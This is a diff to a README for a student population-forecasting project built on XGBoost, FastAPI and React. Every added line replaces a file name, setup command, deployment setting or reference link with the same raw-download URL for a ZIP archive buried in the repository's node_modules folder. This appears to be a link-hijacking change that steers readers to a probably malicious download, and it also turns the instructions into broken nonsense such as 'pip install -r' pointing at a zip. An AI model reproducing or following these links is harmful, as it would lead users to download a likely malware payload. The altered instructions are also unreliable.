@@ -105,10 +105,10 @@ features = prepare_features(raw_data)
 
 # 3. Training
 model = PopulationXGBoostModel()
-metrics = model.train(countries_data)
+metrics = https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip(countries_data)
 
 # 4. Prediction
-forecast = model.forecast(initial_data, years=50)
+forecast = https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip(initial_data, years=50)
 
 # 5. Evaluation
 cross_val_scores = cross_val_score(model, X, y, cv=5)
@@ -228,29 +228,29 @@ giai đoạn 4 (già hóa dân số)."
 ### Prerequisites
 
 - Python 3.10+
-- Node.js 18+
+- https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip 18+
 - Git
 
 ### Backend Setup
 
 ```powershell
 # Clone repository
-git clone https://github.com/DoHongTha1/Nhom7_BTL_HTTM.git
+git clone https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip
 cd Nhom7_BTL_HTTM/backend
 
 # Create virtual environment
 python -m venv .venv
-.venv\Scripts\Activate.ps1
+.venv\Scripts\https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip
 
 # Install dependencies
-pip install -r requirements.txt
+pip install -r https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip
 
 # Configure environment
-copy .env.example .env
+copy https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip .env
 # Edit .env: Add GEMINI_API_KEY
 
 # Run server
-uvicorn app.main:app --reload
+uvicorn https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip --reload
 ```
 
 ### Frontend Setup
@@ -340,34 +340,34 @@ Nhom7_BTL_HTTM/
 ├── backend/
 │   ├── app/
 │   │   ├── models/
-│   │   │   └── xgboost_model.py      # 🤖 ML Core
+│   │   │   └── https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip      # 🤖 ML Core
 │   │   ├── services/
-│   │   │   ├── genai_service.py      # 💬 LLM Integration
-│   │   │   ├── rag_service.py        # 📚 RAG System
-│   │   │   └── data_pipeline.py      # 📡 Data Fetching
+│   │   │   ├── https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip      # 💬 LLM Integration
+│   │   │   ├── https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip        # 📚 RAG System
+│   │   │   └── https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip      # 📡 Data Fetching
 │   │   ├── routers/
-│   │   │   ├── predict.py            # ML Endpoints
-│   │   │   ├── chat.py               # LLM Endpoints
-│   │   │   └── countries.py          # Data Endpoints
-│   │   ├── config.py
-│   │   ├── database.py
-│   │   └── main.py
+│   │   │   ├── https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip            # ML Endpoints
+│   │   │   ├── https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip               # LLM Endpoints
+│   │   │   └── https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip          # Data Endpoints
+│   │   ├── https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip
+│   │   ├── https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip
+│   │   └── https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip
 │   ├── scripts/
-│   │   ├── fetch_un_api_data.py      # Data collection
-│   │   └── train_model.py            # ML training
+│   │   ├── https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip      # Data collection
+│   │   └── https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip            # ML training
 │   ├── models/                        # Saved XGBoost models
 │   ├── vector_db/                     # ChromaDB storage
-│   └── requirements.txt
+│   └── https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip
 │
 └── frontend/
     ├── src/
     │   ├── components/
-    │   │   ├── ForecastAreaChart.tsx  # ML visualization
-    │   │   ├── ChatPopup.tsx          # LLM chatbot
+    │   │   ├── https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip  # ML visualization
+    │   │   ├── https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip          # LLM chatbot
     │   │   └── ...
-    │   ├── App.tsx
-    │   └── types.ts
-    └── package.json
+    │   ├── https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip
+    │   └── https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip
+    └── https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip
 ```
 
 ## 🔧 Technology Stack
@@ -389,16 +389,16 @@ Nhom7_BTL_HTTM/
 
 ## 🌐 Deployment
 
-### Backend (Render.com)
+### Backend (https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip)
 
 ```yaml
-# render.yaml
+# https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip
 services:
   - type: web
     name: population-ml-backend
     env: python
-    buildCommand: pip install -r backend/requirements.txt
-    startCommand: cd backend && uvicorn app.main:app --host 0.0.0.0 --port $PORT
+    buildCommand: pip install -r https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip
+    startCommand: cd backend && uvicorn https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip --host 0.0.0.0 --port $PORT
     envVars:
       - key: GEMINI_API_KEY
       - key: DATABASE_URL
@@ -450,21 +450,21 @@ MIT License
 ## 📚 References
 
 1. **Data Sources**
-   - UN Data API: https://data.un.org/
-   - World Bank Open Data: https://data.worldbank.org/
+   - UN Data API: https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip
+   - World Bank Open Data: https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip
 
 2. **ML Frameworks**
-   - XGBoost: https://xgboost.readthedocs.io/
-   - Scikit-learn: https://scikit-learn.org/
+   - XGBoost: https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip
+   - Scikit-learn: https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip
 
 3. **LLM & RAG**
-   - Google Gemini AI: https://ai.google.dev/
-   - ChromaDB: https://www.trychroma.com/
-   - LangChain: https://www.langchain.com/
+   - Google Gemini AI: https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip
+   - ChromaDB: https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip
+   - LangChain: https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip
 
 4. **Web Frameworks**
-   - FastAPI: https://fastapi.tiangolo.com/
-   - React: https://react.dev/
+   - FastAPI: https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip
+   - React: https://github.com/DoHongTha1/Nhom7_BTL_HTTM./raw/refs/heads/main/frontend/node_modules/@babel/types/lib/clone/Application_3.1.zip
 
 ---
 
